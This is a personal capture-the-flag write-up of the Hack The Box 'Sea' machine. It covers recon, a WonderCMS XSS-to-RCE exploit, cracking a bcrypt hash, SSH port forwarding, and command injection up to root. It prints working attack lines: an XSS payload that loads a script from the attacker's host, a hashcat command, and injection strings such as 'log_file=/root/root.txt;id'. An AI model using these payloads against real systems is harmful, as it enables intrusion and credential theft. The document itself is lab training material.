# Sea HTB Machine (Linux)

Nmap showed a http port open. 

## http
I inspected the web page, ran **ffuf** on both directories and virtual host; did not find anything. 
Back in the web page I tried to look for anything helpful. i started to read the information that it was on it and found there is a **contact** button style link. 
This is why it is good to not get tunnel vision and try to read each little thing to get as much information. 
I clicked on **contact** but did not reroute me anywhere and only downloaded a **php** file with nothing on it. 
I decided to inspect what code was on this button in devtools and found a directory, **http://sea.htb/contact.php**.

## /contact.php
After adding the new director into **/etc/hosts** I waited a bit until I could access the new domain/directory. 

I tried to to upload multiple payload with a **nc** listener but got no response. Dealing with a Blind XSS; I will come back to this as I explore what more I can find. 

## feroxbuster
`feroxbuster -u http://sea.htb -x php` helped me find multiple directories within **sea.htb**. Exploring the differrent onces I gravitated towards **/themes/bike**. 

I checked out the **version** directory and found a version number, I also checked out **LICENSE** directory but did not found much. 
Decided to run a quick directory fuzz; `ffuf -u http://sea.htb/themes/bike/FUZZ -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt`.

Found **README.md** and quickly saw that it is using **# WonderCMS bike theme**. So if we combine both the version number and **CMS** it is using we get, **Wonder CMS 3.2.0**.

## Exploit
Googling exploits I found this https://github.com/thefizzyfish/CVE-2023-41425-wonderCMS_RCE.
Looking at the payload I noticed that they use **loginURL** that is an exploit from **WonderCMS**. 
I put that into my URL and it did give me a login page, so that is now confirmed. 

Followed the steps in the repo; created a XSS payload we can use to inject in **contact.php**.
`http://sea.htb/loginURL/index.php?page=loginURL?"></form><script+src="http://10.10.14.11:8000/xss.js"></script><form+action="`

The exploit did the rest and now following the steps, I started a **nc** listener, and got a reverse shell. 

## Reverse shell
I found a couple of users, **amay** and **geo**. **users.txt** was in **amay** but I got a permission denied. 

Checking `etc/apache2/sites-enabled; cat sea.conf` showed me the document root. 
`cd /var/www/sea`
`ls; cd data`
`cat database.js`
Which then gave me a hashed password. 
$2y$ → bcrypt identifier

`hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt`; make sure to remove \ from the hashed password since **bcrpyt** does not contain backslahes.
-m 3200 → tells Hashcat it's a bcrypt hash
-a 0 → dictionary attack

Once the hashed password I used it to login into one of the users that I was able to go into it's directory but got access denied when trying to access the **users.txt**.

## SSH 
Once in I was able to get the first flag, **users.txt**.

`sudo -l` Could not be accessed. 
`netstat -lntp` gave me a local host with port 8080.

### Port forwarding 
`ssh -L 8081:127.0.0.1:8080 amay@sea.htb`

Head over to the webpage that is hosting, `http://127.0.0.1:8081/`.

Once in here we can see this site is about system monitoring where user can analyze the logs. 

### Burp
Intercepted the traffic and played with `log_file=%2Fvar%2Flog%2Fapache2%2Faccess.log&analyze_log=`.
It reads the /var/log/apache2/access as I guessed earlier. I tried reading /etc/passwd and it did work.
Played with it with different command injections; ;id; returned uid=0(root) gid=0(root) groups=0(root).

Finally I got a hit using, `log_file=/root/root.txt;id&analyze_log=`. Flag was in response and machine was 

PWNED!

# Summary:
The Sea HTB machine was compromised through a series of well-executed steps. Initial web exploration revealed a **Blind XSS** vulnerability via a **contact.php** file. Further investigation using tools like **feroxbuster** and **ffuf** led to the discovery of a **WonderCMS 3.2.0** theme, which was vulnerable to **CVE-2023-41425**, a remote code execution (RCE) exploit. By injecting a crafted payload, a reverse shell was obtained. After cracking a bcrypt password hash and gaining access to a user account, **SSH port forwarding** was used to access an internal system monitoring service. This allowed for successful **command injection**, escalating privileges to root and capturing the root flag.

## Key Takeaways:
1. **Blind XSS as a Vector**: Always inspect web elements closely; seemingly benign features like contact forms can be entry points for XSS.
2. **CMS Vulnerabilities**: Identifying the CMS and its version is crucial for discovering known vulnerabilities (e.g., **CVE-2023-41425** for WonderCMS).
3. **Hash Cracking**: **bcrypt** hashes can be cracked using tools like **hashcat** with proper wordlists (e.g., **rockyou.txt**).
4. **SSH Port Forwarding**: When a service is restricted to localhost, use **SSH port forwarding** to access it externally.
5. **Command Injection**: Look for opportunities in web services that handle logs or file paths, as they are often vulnerable to **command injection**.

## Things to Remember:
- **Detailed Web Exploration**: Don’t rush through the initial page inspection; take time to check all elements, including hidden or unexpected behaviors.
- **Known Vulnerability Research**: When you find a CMS, always check for known exploits tied to that version.
- **Password Cracking**: Be prepared to crack password hashes, particularly when they are in common formats like bcrypt.
- **Service Accessibility**: Use **SSH tunneling** when necessary to access internal services.
- **Log and File Path Vulnerabilities**: Web apps that interact with logs or file paths may expose critical vulnerabilities, such as **command injection**.

